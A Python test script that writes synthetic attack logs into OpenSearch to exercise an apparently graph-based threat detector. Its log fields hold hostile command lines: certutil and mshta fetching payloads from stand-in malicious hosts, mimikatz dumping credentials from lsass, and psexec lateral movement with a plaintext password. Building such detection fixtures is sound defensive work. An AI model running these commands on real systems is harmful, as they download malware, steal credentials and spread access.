"""
inject_raw_attack.py
====================
Injects raw process/network/file event logs into OpenSearch at CURRENT timestamp
so that main.py's sliding window picks them up on the next hunt cycle.

These are intentionally NOVEL, multi-hop graphs (3-8 edges per chain) that
the GNN+Triple Ensemble should flag as anomalies versus the benign baseline.

Run AFTER main.py is running:
    python inject_raw_attack.py

Expected orchestrator output within 60 seconds:
    [HUNT] Fetched N logs
    [HUNT] Encoding K subgraphs...
    [ALERT] ANALYZING M DETECTIONS IN PARALLEL
"""

import os
import sys
import time
from datetime import datetime, timezone, timedelta
from opensearchpy import OpenSearch, helpers
from dotenv import load_dotenv

load_dotenv()

HOST = os.getenv("OPENSEARCH_HOST", "localhost")
PORT = int(os.getenv("OPENSEARCH_PORT", "9201"))
INDEX = "logs-sentinel"

client = OpenSearch(
    hosts=[{"host": HOST, "port": PORT}],
    http_compress=True,
    use_ssl=False,
    verify_certs=False,
    ssl_assert_hostname=False,
    ssl_show_warn=False,
)

def now(offset_sec: int = 0) -> str:
    """Return UTC ISO timestamp. offset_sec > 0 means earlier in the past."""
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_sec)).strftime(
        "%Y-%m-%dT%H:%M:%S.%f"
    )[:-3] + "Z"

# ---------------------------------------------------------------------------
# Attack‑chain definitions
# Each entry maps to a field name the SchemaMapper / graph_builder understands.
# Field names follow the "sentinel_ecs" parser convention (ECS-flavoured).
# ---------------------------------------------------------------------------

CHAINS = []

# ── 1. OUTLOOK → WINWORD → CERTUTIL ──────────────────────────────────────
CHAINS.append([
    {"@timestamp": now(45), "process.name": "OUTLOOK.EXE",      "target.process.name": "WINWORD.EXE",   "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\jsmith", "process.parent.name": "explorer.exe",  "CommandLine": "WINWORD.EXE invoice_Q2.docm", "IntegrityLevel": "Medium"},
    {"@timestamp": now(40), "process.name": "WINWORD.EXE",       "target.process.name": "certutil.exe",  "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\jsmith", "process.parent.name": "OUTLOOK.EXE",   "CommandLine": "certutil.exe -urlcache -split -f http://dl.bad-domain.ru/stage2.exe C:\\ProgramData\\stage2.exe"},
    {"@timestamp": now(38), "process.name": "certutil.exe",      "file.path": "C:\\ProgramData\\stage2.exe", "TargetFilename": "C:\\ProgramData\\stage2.exe", "event.action": "file_write", "EventID": "11",   "user.name": "CORP\\jsmith"},
    {"@timestamp": now(35), "process.name": "certutil.exe",      "target.process.name": "stage2.exe",    "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\jsmith", "process.parent.name": "WINWORD.EXE",   "CommandLine": "C:\\ProgramData\\stage2.exe --install"},
    {"@timestamp": now(30), "process.name": "stage2.exe",        "src_ip": "10.0.0.55",                  "dst_ip": "185.220.101.50",        "dst_port": 443,   "protocol": "TCP", "event.action": "network_connect", "EventID": "3", "user.name": "CORP\\jsmith", "bytes_sent": 4096, "bytes_received": 81920},
    {"@timestamp": now(25), "process.name": "stage2.exe",        "target.process.name": "cmd.exe",       "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\jsmith", "process.parent.name": "stage2.exe",    "CommandLine": "cmd.exe /c whoami && ipconfig /all > C:\\ProgramData\\recon.txt"},
    {"@timestamp": now(20), "process.name": "cmd.exe",           "file.path": "C:\\ProgramData\\recon.txt", "TargetFilename": "C:\\ProgramData\\recon.txt", "event.action": "file_write", "EventID": "11",  "user.name": "CORP\\jsmith"},
])

# ── 2. POWERSHELL ENCODE → LSASS ACCESS → DUMP ──────────────────────────
CHAINS.append([
    {"@timestamp": now(50), "process.name": "powershell.exe",    "target.process.name": "lsass.exe",     "event.action": "process_access", "EventID": "10",   "user.name": "CORP\\administrator", "process.parent.name": "cmd.exe",     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABzAGUAYwByAGUAdAA="},
    {"@timestamp": now(48), "process.name": "powershell.exe",    "file.path": "C:\\Windows\\Temp\\lsass.dmp", "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp", "event.action": "file_write", "EventID": "11", "user.name": "CORP\\administrator"},
    {"@timestamp": now(45), "process.name": "powershell.exe",    "src_ip": "10.0.1.10",                  "dst_ip": "10.0.1.200",           "dst_port": 445,   "protocol": "TCP", "event.action": "network_connect", "EventID": "3", "user.name": "CORP\\administrator", "bytes_sent": 204800},
    {"@timestamp": now(42), "process.name": "net.exe",           "target.process.name": "cmd.exe",       "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\administrator", "process.parent.name": "powershell.exe","CommandLine": "net use \\\\10.0.1.200\\C$ /user:CORP\\administrator P@ssw0rd!"},
    {"@timestamp": now(38), "process.name": "cmd.exe",           "target.process.name": "psexec.exe",    "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\administrator", "process.parent.name": "net.exe",      "CommandLine": "psexec.exe \\\\10.0.1.200 -s cmd.exe", "IntegrityLevel": "System"},
    {"@timestamp": now(35), "process.name": "psexec.exe",        "file.path": "C:\\Windows\\System32\\PSEXESVC.exe", "TargetFilename": "C:\\Windows\\System32\\PSEXESVC.exe", "event.action": "file_write", "EventID": "11", "user.name": "NT AUTHORITY\\SYSTEM"},
])

# ── 3. CHROME → MSHTA → SVCHOST (C2 Beacon) ─────────────────────────────
CHAINS.append([
    {"@timestamp": now(60), "process.name": "chrome.exe",        "target.process.name": "mshta.exe",     "event.action": "process_create", "EventID": "4688", "user.name": "CORP\\msmith",  "process.parent.name": "explorer.exe",  "CommandLine": "mshta.exe http://cdn-evil.info/payload.hta"},
    {"@timestamp": now(57), "process.name": "mshta.exe",         "target.process.name": "svchost.exe",   "event.action": "process_inject", "EventID": "8",    "user.name": "CORP\\msmith",  "process.parent.name": "chrome.exe",    "CommandLine": "VirtualAllocEx -> CreateRemoteThread"},
    {"@timestamp": now(54), "process.name": "svchost.exe",       "src_ip": "10.0.2.88",                  "dst_ip": "91.108.4.12",          "dst_port": 8080,  "protocol": "TCP", "event.action": "network_connect", "EventID": "3", "user.name": "NT AUTHORITY\\SYSTEM", "bytes_sent": 512, "bytes_received": 16384},
    {"@timestamp": now(50), "process.name": "svchost.exe",       "target.process.name": "mimikatz.exe",  "event.action": "process_create", "EventID": "4688", "user.name": "NT AUTHORITY\\SYSTEM","process.parent.name": "svchost.exe","CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"},
    {"@timestamp": now(47), "process.name": "mimikatz.exe",      "target.process.name": "lsass.exe",     "event.action": "process_access", "EventID": "10",   "user.name": "NT AUTHORITY\\SYSTEM","process.parent.name": "svchost.exe"},
    {"@timestamp": now(44), "process.name": "svchost.exe",       "src_ip": "10.0.2.88",                  "dst_ip": "91.108.4.12",          "dst_port": 8080,  "protocol": "TCP", "event.action": "network_connect", "EventID": "3", "user.name": "NT AUTHORITY\\SYSTEM", "bytes_sent": 2048, "bytes_received": 65536},
    {"@timestamp": now(40), "process.name": "svchost.exe",       "target.process.name": "WmiPrvSE.exe",  "event.action": "process_create", "EventID": "4688", "user.name": "NT AUTHORITY\\SYSTEM","process.parent.name": "svchost.exe","CommandLine": "wmic /node:10.0.2.200 process call create calc.exe"},
])

# ---------------------------------------------------------------------------
# Bulk-index all chains
# ---------------------------------------------------------------------------
actions = []
for chain in CHAINS:
    for log in chain:
        actions.append({"_index": INDEX, "_source": log})

print(f"[*] Connecting to OpenSearch at {HOST}:{PORT}...")
try:
    if not client.ping():
        print("[!] ERROR: Cannot reach OpenSearch. Is docker-compose up?")
        sys.exit(1)
except Exception as e:
    print(f"[!] Connection error: {e}")
    sys.exit(1)

print(f"[*] Injecting {len(actions)} raw attack-chain events across {len(CHAINS)} chains...")
ok, errors = helpers.bulk(client, actions, raise_on_error=False)
print(f"[+] Indexed {ok} documents. Errors: {len(errors)}")
if errors:
    for err in errors[:5]:
        print(f"    - {err}")

print()
print(f"[+] Done! Logs are in index: {INDEX}")
print(f"[+] The orchestrator (main.py) will pick these up within its next 60-second hunt cycle.")
print(f"[+] Watch for: '[HUNT] Fetched N logs' and '[ALERT] ANALYZING M DETECTIONS'")
print()
# Print chain summary
for i, chain in enumerate(CHAINS):
    proc_flow = " -> ".join(
        log.get("process.name", "?") for log in chain
    )
    print(f"  Chain {i+1}: {proc_flow}")
